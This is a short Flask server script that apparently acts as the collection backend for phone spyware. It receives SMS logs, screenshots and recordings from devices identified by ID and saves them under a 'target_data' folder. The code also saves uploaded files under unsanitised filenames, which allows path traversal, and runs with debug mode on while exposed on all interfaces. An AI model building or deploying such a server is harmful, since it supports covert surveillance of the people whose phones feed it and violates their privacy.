from flask import Flask, request, jsonify
import os

app = Flask(__name__)
UPLOAD_DIR = "target_data"
os.makedirs(os.path.join(UPLOAD_DIR, "sms"), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_DIR, "screenshots"), exist_ok=True)
os.makedirs(os.path.join(UPLOAD_DIR, "recordings"), exist_ok=True)

@app.route('/api/upload_logs', methods=['POST'])
def upload_logs():
    data = request.json
    device_id = data.get('device_id', 'unknown_device')
    log_type = data.get('type', 'general')
    content = data.get('content', [])
    
    print(f"[{log_type.upper()}] Received {len(content)} items from Device ID: {device_id}")
    return jsonify({"status": "success", "message": "Logs received successfully"}), 200

@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    file_type = request.form.get('file_type', 'file')
    if 'file' not in request.files:
        return jsonify({"error": "No file part in request"}), 400
        
    file = request.files['file']
    subfolder = "screenshots" if file_type == 'screenshot' else "recordings"
    filepath = os.path.join(UPLOAD_DIR, subfolder, file.filename)
    file.save(filepath)
    
    print(f"[{file_type.upper()}] File saved successfully: {filepath}")
    return jsonify({"status": "success", "path": filepath}), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
  
